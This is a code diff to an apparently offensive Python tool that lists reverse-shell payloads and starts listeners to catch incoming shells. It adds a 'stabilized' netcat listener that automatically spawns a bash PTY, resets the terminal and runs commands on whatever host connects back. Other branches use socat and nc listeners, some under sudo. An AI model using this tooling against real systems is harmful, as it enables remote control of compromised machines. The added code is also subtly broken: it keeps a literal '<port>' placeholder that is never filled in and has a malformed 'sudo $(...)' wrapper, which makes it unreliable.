@@ -44,15 +44,12 @@ def main():
             print(GREEN(desc))
             print(cmd)
 
-    c = input('Select your payload, press "l" to listen on port {} or enter to exit: '.format(port))
+    c = input('Select your payload, press "l" or "ls" to listen on port {} or enter to exit: '.format(port))
     if c == 'l':
         if int(port) < 1024:
             if shell_type == 'SOCAT':
                 print(shell_type)
                 system('sudo socat file:`tty`,raw,echo=0 tcp-listen:{},fork'.format(port))
-            # stablizied NC Listener
-            elif: 
-                system('stty raw -echo; (echo \'script -qc "/bin/bash" /dev/null\';echo pty;echo "stty$(stty -a | awk -F \';\' \'{print $2 $3}\' | head -n 1)";echo export PATH=\\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll=\'ls -lsaht\'; echo clear; echo id;cat) | nc -lvnp <port> && reset')
             else:
                 system('sudo nc -n -v -l -s {} -p {}'.format(ipaddr, port))
         else:
@@ -61,6 +58,13 @@ def main():
                 system('socat file:`tty`,raw,echo=0 tcp-listen:{},fork'.format(port))
             else:
                 system('nc -n -v -l -s {} -p {}'.format(ipaddr, port))
+      
+    # stablizied NC Listener
+    elif c == 'ls':
+        if int(port) < 1024:
+            system('sudo $(stty raw -echo; (echo \'script -qc "/bin/bash" /dev/null\';echo pty;echo "stty$(stty -a | awk -F \';\' \'{print $2 $3}\' | head -n 1)";echo export PATH=\\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll=\'ls -lsaht\'; echo clear; echo id;cat) | nc -lvnp <port> && reset')
+        else: 
+             system('stty raw -echo; (echo \'script -qc "/bin/bash" /dev/null\';echo pty;echo "stty$(stty -a | awk -F \';\' \'{print $2 $3}\' | head -n 1)";echo export PATH=\\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll=\'ls -lsaht\'; echo clear; echo id;cat) | nc -lvnp <port> && reset')
 
 if __name__ == "__main__":
     main()
